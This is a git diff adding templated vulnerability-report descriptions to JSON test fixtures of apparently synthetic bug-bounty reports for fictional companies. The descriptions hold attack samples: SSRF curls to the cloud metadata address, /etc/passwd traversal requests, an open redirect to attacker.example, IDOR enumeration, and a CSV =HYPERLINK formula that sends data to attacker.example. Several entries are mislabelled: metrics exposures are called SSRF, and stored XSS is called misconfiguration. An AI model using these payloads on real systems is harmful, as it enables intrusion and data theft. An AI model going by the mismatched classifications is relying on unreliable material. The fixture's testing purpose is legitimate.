+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20309,7 +20463,8 @@
           "offset": "11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20456,7 +20611,8 @@
           "offset": "8d 13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20561,7 +20717,8 @@
           "offset": "4d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20681,7 +20838,8 @@
           "offset": "3d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.aareguard-cyber.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20783,7 +20941,8 @@
           "offset": "3d 15h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20907,7 +21066,8 @@
           "offset": "3d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21086,7 +21246,8 @@
           "offset": "5d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21182,7 +21343,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21317,7 +21479,8 @@
           "offset": "1d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21477,7 +21640,8 @@
           "offset": "5d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21601,7 +21765,8 @@
           "offset": "1d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21737,7 +21902,8 @@
           "offset": "5d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21873,7 +22039,8 @@
           "offset": "4d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21995,7 +22162,8 @@
           "offset": "4d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22110,7 +22278,8 @@
           "offset": "3d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22256,7 +22425,8 @@
           "offset": "4d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22367,7 +22537,8 @@
           "offset": "4d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -22518,7 +22689,8 @@
           "offset": "2d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22637,7 +22809,8 @@
           "offset": "5d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22809,7 +22982,8 @@
           "offset": "4d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22953,7 +23127,8 @@
           "offset": "5d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.aareguard-cyber.foo/profile`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23073,7 +23248,8 @@
           "offset": "1d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23208,7 +23384,8 @@
           "offset": "1d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23339,7 +23516,8 @@
           "offset": "2d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23502,7 +23680,8 @@
           "offset": "3d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23597,7 +23776,8 @@
           "offset": "1d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/alpenblick_hospitality_ag_reports.json b/fixtures/reports/alpenblick_hospitality_ag_reports.json
index c2e6f59..39f058c 100644
--- a/fixtures/reports/alpenblick_hospitality_ag_reports.json
+++ b/fixtures/reports/alpenblick_hospitality_ag_reports.json
@@ -62,7 +62,8 @@
           "offset": "3d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -254,7 +255,8 @@
           "offset": "9d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.alpenblick-hospitality.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -374,7 +376,8 @@
           "offset": "1d 16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -497,7 +500,8 @@
           "offset": "2d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenblick-hospitality.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -651,7 +655,8 @@
           "offset": "3d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
